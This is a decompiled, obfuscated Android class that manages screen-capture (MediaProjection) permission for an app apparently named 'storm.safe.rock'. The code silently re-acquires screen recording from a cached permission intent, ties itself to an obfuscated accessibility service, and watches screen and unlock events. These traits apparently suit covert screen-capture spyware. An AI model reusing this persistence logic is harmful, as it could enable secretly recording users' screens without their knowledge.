package com.storm.safe.rock.manager;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import com.storm.safe.rock.AbstractC0241a0;
import com.storm.safe.rock.service.C0286a6;
import com.storm.safe.rock.service.dqtvuisjd;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import kotlin.Pair;
import kotlin.coroutines.AbstractC0775a0;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.ContinuationImpl;
import kotlinx.coroutines.AbstractC0780a0;
import kotlinx.coroutines.android.C0785a0;
import p000.AbstractC1117qo;
import p000.AbstractC1262tj;
import p000.C0873ms;
import p000.ExecutorC1158qw;
import p000.b81;
import p000.kg1;
import p000.sc0;
import p000.t60;
import p000.u11;
import p000.y01;
import p000.y21;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.manager.a4 */
/* loaded from: classes2.dex */
public final class C0262a4 {

    /* renamed from: b5 */
    public static final y01 f52127b5 = new y01(null);

    /* renamed from: b6 */
    public static volatile C0262a4 f52128b6;

    /* renamed from: a0 */
    public final Context f52129a0;

    /* renamed from: a1 */
    public MediaProjection f52130a1;

    /* renamed from: a2 */
    public MediaProjectionManager f52131a2;

    /* renamed from: a3 */
    public final AtomicBoolean f52132a3 = new AtomicBoolean(false);

    /* renamed from: a4 */
    public final AtomicBoolean f52133a4 = new AtomicBoolean(false);

    /* renamed from: a5 */
    public final AtomicInteger f52134a5 = new AtomicInteger(0);

    /* renamed from: a6 */
    public final AtomicInteger f52135a6 = new AtomicInteger(0);

    /* renamed from: a7 */
    public volatile long f52136a7;

    /* renamed from: a8 */
    public volatile long f52137a8;

    /* renamed from: a9 */
    public final C0873ms f52138a9;

    /* renamed from: b0 */
    public final C0873ms f52139b0;

    /* renamed from: b1 */
    public u11 f52140b1;

    /* renamed from: b2 */
    public final LinkedHashSet f52141b2;

    /* renamed from: b3 */
    public final SmartMediaProjectionManager$systemStateReceiver$1 f52142b3;

    /* renamed from: b4 */
    public final C0261a3 f52143b4;

    /* JADX WARN: Type inference failed for: r2v12, types: [com.storm.safe.rock.manager.SmartMediaProjectionManager$systemStateReceiver$1] */
    public C0262a4(Context context) {
        this.f52129a0 = context;
        ExecutorC1158qw executorC1158qw = AbstractC1262tj.f60234a1;
        y21 y21Var = new y21();
        executorC1158qw.getClass();
        this.f52138a9 = AbstractC1117qo.m214407a0(AbstractC0775a0.m213638a1(executorC1158qw, y21Var));
        C0785a0 c0785a0 = sc0.f59953a0;
        y21 y21Var2 = new y21();
        c0785a0.getClass();
        this.f52139b0 = AbstractC1117qo.m214407a0(AbstractC0775a0.m213638a1(c0785a0, y21Var2));
        this.f52141b2 = new LinkedHashSet();
        this.f52142b3 = new BroadcastReceiver() { // from class: com.storm.safe.rock.manager.SmartMediaProjectionManager$systemStateReceiver$1
            @Override // android.content.BroadcastReceiver
            public void onReceive(Context context2, Intent intent) {
                String action;
                if (intent == null || (action = intent.getAction()) == null) {
                    return;
                }
                C0262a4 c0262a4 = this.f52062a0;
                AbstractC0780a0.m213692a3(c0262a4.f52138a9, null, new SmartMediaProjectionManager$systemStateReceiver$1$onReceive$1(action, c0262a4, null), 3);
            }
        };
        this.f52143b4 = new C0261a3(this);
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0015  */
    /* renamed from: a0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final Object m211336a0(C0262a4 c0262a4, ContinuationImpl continuationImpl) throws Throwable {
        SmartMediaProjectionManager$attemptSilentRecovery$1 smartMediaProjectionManager$attemptSilentRecovery$1;
        AtomicInteger atomicInteger = c0262a4.f52134a5;
        if (continuationImpl instanceof SmartMediaProjectionManager$attemptSilentRecovery$1) {
            smartMediaProjectionManager$attemptSilentRecovery$1 = (SmartMediaProjectionManager$attemptSilentRecovery$1) continuationImpl;
            int i = smartMediaProjectionManager$attemptSilentRecovery$1.f52052a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                smartMediaProjectionManager$attemptSilentRecovery$1.f52052a3 = i - Integer.MIN_VALUE;
            } else {
                smartMediaProjectionManager$attemptSilentRecovery$1 = new SmartMediaProjectionManager$attemptSilentRecovery$1(c0262a4, continuationImpl);
            }
        }
        Object obj = smartMediaProjectionManager$attemptSilentRecovery$1.f52050a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = smartMediaProjectionManager$attemptSilentRecovery$1.f52052a3;
        try {
            if (i2 == 0) {
                kg1.m213544f4(obj);
                if (atomicInteger.get() >= 5) {
                    t60.m214726f4("SmartMediaProjection", "⚠️ 已达到最大静默恢复次数(5)");
                    return Boolean.FALSE;
                }
                atomicInteger.incrementAndGet();
                smartMediaProjectionManager$attemptSilentRecovery$1.f52049a0 = c0262a4;
                smartMediaProjectionManager$attemptSilentRecovery$1.f52052a3 = 1;
                if (b81.m210571b1(3000L, smartMediaProjectionManager$attemptSilentRecovery$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
            } else {
                if (i2 != 1) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                c0262a4 = smartMediaProjectionManager$attemptSilentRecovery$1.f52049a0;
                kg1.m213544f4(obj);
            }
            Integer num = AbstractC0241a0.f51907a1;
            Pair pair = num != null ? new Pair(num, AbstractC0241a0.f51908a2) : null;
            if (pair != null) {
                int iIntValue = ((Number) pair.f57556a0).intValue();
                Intent intent = (Intent) pair.f57557a1;
                if (intent != null && c0262a4.m211340a4(intent, iIntValue) != null) {
                    c0262a4.m211342a6();
                    c0262a4.f52134a5.set(0);
                    c0262a4.f52135a6.set(0);
                    return Boolean.TRUE;
                }
            }
            t60.m214726f4("SmartMediaProjection", "❌ 静默恢复失败，权限数据不可用");
            return Boolean.FALSE;
        } catch (Exception e) {
            t60.m214705c6("SmartMediaProjection", "❌ 静默恢复异常", e);
            return Boolean.FALSE;
        }
    }

    /* renamed from: a1 */
    public static final boolean m211337a1(C0262a4 c0262a4) {
        long jCurrentTimeMillis = System.currentTimeMillis();
        if (c0262a4.f52135a6.get() >= 3) {
            t60.m214726f4("SmartMediaProjection", "⚠️ 已达到最大用户恢复次数");
            return false;
        }
        if (jCurrentTimeMillis - c0262a4.f52136a7 < (Build.VERSION.SDK_INT >= 35 ? 120000L : 30000L)) {
            return false;
        }
        if (dqtvuisjd.f52358m1.isServiceReady()) {
            return true;
        }
        t60.m214726f4("SmartMediaProjection", "⚠️ AccessibilityService未就绪，不提示用户恢复");
        return false;
    }

    /* renamed from: a2 */
    public final void m211338a2() {
        try {
            this.f52132a3.set(false);
            u11 u11Var = this.f52140b1;
            if (u11Var != null) {
                u11Var.m215253a7(null);
            }
            AbstractC1117qo.m214410a3(this.f52138a9);
            AbstractC1117qo.m214410a3(this.f52139b0);
            m211339a3();
            try {
                this.f52129a0.unregisterReceiver(this.f52142b3);
            } catch (Exception unused) {
            }
            this.f52141b2.clear();
            f52128b6 = null;
        } catch (Exception e) {
            t60.m214705c6("SmartMediaProjection", "❌ 清理失败", e);
        }
    }

    /* renamed from: a3 */
    public final void m211339a3() {
        try {
            MediaProjection mediaProjection = this.f52130a1;
            if (mediaProjection != null) {
                mediaProjection.unregisterCallback(this.f52143b4);
            }
            this.f52130a1 = null;
            if (Build.VERSION.SDK_INT < 35) {
                AbstractC0241a0.m211176a0();
            }
        } catch (Exception e) {
            t60.m214705c6("SmartMediaProjection", "❌ 清理MediaProjection失败", e);
        }
    }

    /* renamed from: a4 */
    public final MediaProjection m211340a4(Intent intent, int i) {
        try {
            MediaProjectionManager mediaProjectionManager = this.f52131a2;
            MediaProjection mediaProjection = mediaProjectionManager != null ? mediaProjectionManager.getMediaProjection(i, intent) : null;
            if (mediaProjection != null) {
                mediaProjection.registerCallback(this.f52143b4, new Handler(Looper.getMainLooper()));
                this.f52130a1 = mediaProjection;
                AbstractC0241a0.f51906a0 = mediaProjection;
                AbstractC0241a0.f51909a3 = System.currentTimeMillis();
                t60.m214714d6("MediaProjectionHolder", "✅ MediaProjection已设置，时间戳: " + AbstractC0241a0.f51909a3);
            }
            return mediaProjection;
        } catch (Exception e) {
            t60.m214705c6("SmartMediaProjection", "❌ 创建MediaProjection失败", e);
            return null;
        }
    }

    /* renamed from: a5 */
    public final void m211341a5() {
        Context context = this.f52129a0;
        AtomicBoolean atomicBoolean = this.f52132a3;
        try {
            if (atomicBoolean.get()) {
                return;
            }
            Object systemService = context.getSystemService("media_projection");
            MediaProjectionManager mediaProjectionManager = systemService instanceof MediaProjectionManager ? (MediaProjectionManager) systemService : null;
            this.f52131a2 = mediaProjectionManager;
            if (mediaProjectionManager == null) {
                t60.m214704c5("SmartMediaProjection", "❌ 无法获取MediaProjectionManager");
                return;
            }
            SmartMediaProjectionManager$systemStateReceiver$1 smartMediaProjectionManager$systemStateReceiver$1 = this.f52142b3;
            IntentFilter intentFilter = new IntentFilter();
            intentFilter.addAction("android.intent.action.SCREEN_OFF");
            intentFilter.addAction("android.intent.action.USER_PRESENT");
            intentFilter.addAction("com.storm.safe.rock.intent.USER_STOPPED_PROJECTION");
            if (Build.VERSION.SDK_INT >= 33) {
                context.registerReceiver(smartMediaProjectionManager$systemStateReceiver$1, intentFilter, 2);
            } else {
                context.registerReceiver(smartMediaProjectionManager$systemStateReceiver$1, intentFilter);
            }
            try {
                Integer num = AbstractC0241a0.f51907a1;
                Pair pair = num != null ? new Pair(num, AbstractC0241a0.f51908a2) : null;
                if (pair != null) {
                    int iIntValue = ((Number) pair.f57556a0).intValue();
                    Intent intent = (Intent) pair.f57557a1;
                    if (intent != null && m211340a4(intent, iIntValue) != null) {
                        m211342a6();
                    }
                }
            } catch (Exception e) {
                t60.m214705c6("SmartMediaProjection", "❌ 检查现有权限失败", e);
            }
            u11 u11Var = this.f52140b1;
            if (u11Var != null) {
                u11Var.m215253a7(null);
            }
            this.f52140b1 = AbstractC0780a0.m213692a3(this.f52138a9, null, new SmartMediaProjectionManager$startPermissionMonitoring$1(this, null), 3);
            atomicBoolean.set(true);
        } catch (Exception e2) {
            t60.m214705c6("SmartMediaProjection", "❌ 初始化失败", e2);
        }
    }

    /* renamed from: a6 */
    public final void m211342a6() {
        Iterator it = this.f52141b2.iterator();
        while (it.hasNext()) {
            try {
                ((C0286a6) it.next()).m211395a1();
            } catch (Exception e) {
                t60.m214705c6("SmartMediaProjection", "❌ 通知权限恢复失败", e);
            }
        }
    }
}
